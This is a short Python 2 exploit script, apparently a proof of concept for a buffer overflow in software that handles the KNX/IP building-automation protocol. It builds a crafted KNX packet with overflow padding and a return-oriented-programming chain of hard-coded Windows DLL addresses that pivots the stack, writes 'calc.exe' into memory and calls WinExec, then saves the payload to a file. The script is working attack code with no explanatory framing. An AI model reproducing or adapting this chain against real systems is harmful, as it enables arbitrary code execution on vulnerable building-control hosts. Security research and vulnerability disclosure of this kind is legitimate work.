from struct import pack, unpack

knxhdr = "\x06\x10\x05\x30\x01\xb2"
knxmsg = "\xac\x01\x81\xa9\xe3\xac\xcb\x44\xff\xa2\x67\xcd\x03\x6f\x05\xe4\x58\x19\xae\x65\x1b\x14\x38\x4d\x83\x60\x06"
padding = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
exit = "\xfa\xca\x81\x7c"

eip = pack("<L", 0x774FDB5B)  # xor eax,ea ;zero out register
eip += pack("<L", 0x77550F6F)  # add eax,64h    ;add jump distance
eip += pack("<L", 0x774FF447)  # add eax,esp    ;add the current position of esp
eip += pack("<L", 0x7E467666)  # xchg esp,eax   ;load the new esp address
# --- padding ret-sled as NOP-sled
eip += pack("<L", 0x77550F72) * 28  # ret            ;use ret as nop
# --- str chunk 1
eip += pack("<L", 0x7752F82A)  # pop ecx        ;load string
eip += "calc"  # "calc"         ;string
eip += pack("<L", 0x774FAF34)  # pop eax        ;load dst. address
eip += pack("<L", 0x7FFDF8F4)  # f4f8fd7f       ;dst address
eip += pack("<L", 0x77593502)  # mov [eax], ecx ;copy ecx to [eax]
# --- str chunk 2
eip += pack("<L", 0x7752F82A)  # pop ecx        ;load string
eip += ".exe"  # ".exe"         ;string
eip += pack("<L", 0x774FAF34)  # pop eax        ;load dst. address
eip += pack("<L", 0x7FFDF8F4 + 4)  # f4f8fd7f +4  ;dst address + 4
eip += pack("<L", 0x77593502)  # mov [eax], ecx ;copy str. to dst.

# --- call WinExec()
eip += pack("<L", 0x7C8623AD)  # address of WinExec()
eip += pack("<L", 0x7C81CAFA)  # ret after WinExec(), into ExitProcess 0x7c81cafa
eip += pack("<L", 0x7FFDF8F4)  # address of string

# DEBUG
# ostr = "\\x".join("{:02x}".format(ord(c)) for c in eip)
# print "\\x%s" %ostr

# sendpayload(knxhdr + knxmsg + padding + eip)

with open("cve.raw", "w") as file:
    file.write(knxhdr + knxmsg + padding + eip)
#     file.write(knxhdr + knxmsg + padding + exit)
